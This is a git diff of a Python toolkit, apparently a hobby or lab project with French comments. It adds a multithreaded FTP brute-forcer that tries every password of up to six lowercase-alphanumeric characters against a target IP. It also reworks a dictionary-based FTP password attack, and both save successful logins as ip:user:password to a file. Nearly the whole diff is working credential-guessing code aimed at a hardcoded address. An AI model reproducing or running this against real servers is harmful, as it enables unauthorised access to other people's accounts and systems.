@@ -19,32 +19,54 @@ class TOOLS():
 		pass
 
 	#TODO : sur le ftp
-	def BruteForce (self,IP,nombre_caractaire):
+	def BruteForce_nodico (self,ip,user):
 
-		USER = "root"
+		def BruteForce_pwd(ip,user,FILE,pwd):
+					try:
+						ftplib.FTP(ip,user,pwd)
+					except:
+						pass
+					else:
+						FILE = open(FILE,"a+") 
+						FILE.write(ip +":"+ user +":"+ pwd + "\n")
+						FILE.close()
+		def BruteForce_thread(ip,user,FILE):
+			LETRE="abcdefghijklmnopqrstuvwxyz1234567890"
+			list=[]
+			list[:0]=LETRE
 
-		try :
-			ftplib.FTP(IP,USER,nombre_caractaire)
-		except(ConnectionRefusedError):
-			print("port fermé")
-		except(ftplib.error_perm):
-			print("impoissible de se log")
-		else:
-			print ("ok")
+			for l1 in list:
+				threading.Thread(target=BruteForce_pwd, args=(ip,user,FILE,l1)).start()
+				for l2 in list:
+					threading.Thread(target=BruteForce_pwd, args=(ip,user,FILE,l1 + l2)).start()
+					for l3 in list:
+						threading.Thread(target=BruteForce_pwd, args=(ip,user,FILE,l1 + l2 + l3)).start()
+						for l4 in list:
+							threading.Thread(target=BruteForce_pwd, args=(ip,user,FILE,l1 + l2 + l3 + l4)).start()
+							for l5 in list:
+								threading.Thread(target=BruteForce_pwd, args=(ip,user,FILE,l1 + l2 + l3 + l4 + l5)).start()
+								for l6 in list:
+									threading.Thread(target=BruteForce_pwd, args=(ip,user,FILE,l1 + l2 + l3 + l4 + l5 + l6)).start()
+
+		DATE = f'{datetime.now():%m-%d-%Y-%H-%M-%S}'
+		FILE = "TOOLS/"+"BRUTE_FORCE"+DATE
 
 
-	def BruteForce_dico (self,file,ip,user):
+		threading.Thread(target=BruteForce_thread, args=(ip,user,FILE)).start()
+
+		return FILE
+
+
+
+	def BruteForce_dico (self,ip,file,user):
 		def BruteForce(ip,user,pwd,FILE):
 			try:
 				ftplib.FTP(ip,user,pwd)
-			except(ConnectionRefusedError):
-				pass
-			except(ftplib.error_perm):
+			except:
 				pass
 			else:
-
 				FILE = open(FILE,"a+") 
-				FILE.write(ip + user + pwd + "\n")
+				FILE.write(ip +":"+ user +":"+ pwd + "\n")
 				FILE.close()
 
 		DATE = f'{datetime.now():%m-%d-%Y-%H-%M-%S}'
@@ -96,10 +118,32 @@ if __name__ == '__main__':
 	boite_a_outils = TOOLS()
 	IP = "172.20.20.35"
 
-	boite_a_outils.BruteForce_dico(IP,)
-	#boite_a_outils.BruteForce(IP,0)
+
+
+
+
+
+
 
 	"""
+	chaine = ""
+	x = 0
+	while True:
+		chaine = ""
+
+		for l in list:
+
+			chaine = l + chaine
+			print (chaine)
+
+		mv =list[0]
+		del list[0]
+		list.append(mv)
+		if len(list) == x:
+			break
+		print (x)
+		x = x + 1
+
 	LETRE="ABCDC"
 	list=[]
 	list[:0]=LETRE
@@ -127,7 +171,5 @@ if __name__ == '__main__':
 	
 
 
-
-	pass
 else:
 	print ("Le script tools a été importer avec succès")
